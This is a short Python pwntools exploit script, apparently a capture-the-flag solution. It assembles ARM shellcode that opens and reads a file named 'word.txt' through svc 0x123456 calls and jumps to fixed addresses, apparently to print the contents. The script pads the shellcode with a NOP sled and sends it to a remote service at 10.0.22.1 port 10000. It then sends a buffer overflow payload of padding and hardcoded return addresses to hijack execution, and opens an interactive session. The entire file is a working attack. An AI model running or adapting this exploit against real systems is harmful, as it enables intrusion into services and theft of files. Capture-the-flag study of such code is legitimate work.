#!/usr/bin/env python

# by Sean

from pwn import *

context.arch='arm'
s = asm('''
        sub sp, 0x100
        ldr r0, =0x64726f77
        ldr r1, =0x7478742e
        mov r2, 0
        str r0, [sp]
        str r1, [sp, 4]
        str r2, [sp, 8]

        mov r0, sp
        mov r1, 0
        mov r2, 8
        str r0, [sp, 16]
        str r1, [sp, 20]
        str r2, [sp, 24]
        mov r0, 1
        add r1, sp, 16
        svc 0x123456

        add r1, sp, 32
        mov r2, 100
        str r0, [sp, 16]
        str r1, [sp, 20]
        str r2, [sp, 24]
        mov r0, 6
        add r1, sp, 16
        svc 0x123456

        add r0, sp, 32
        mov r5, 0x40b0
        blx r5

        mov r0, 0x41b0
        blx r0
''')

print 'size =', len(s)
print disasm(s)

s = asm('nop') * ((252 - len(s)) / 4) + s

r = remote('10.0.22.1', 10000)
#r = remote('127.0.0.1', 10000)

print r.recvuntil('Push Enter: ')
r.send(s + '\n')


print r.recvuntil('Input name: ')

#context.log_level = 0

r.send('A'*0x14 + p32(0x4700) + p32(0x4720) + '\n')


r.interactive()
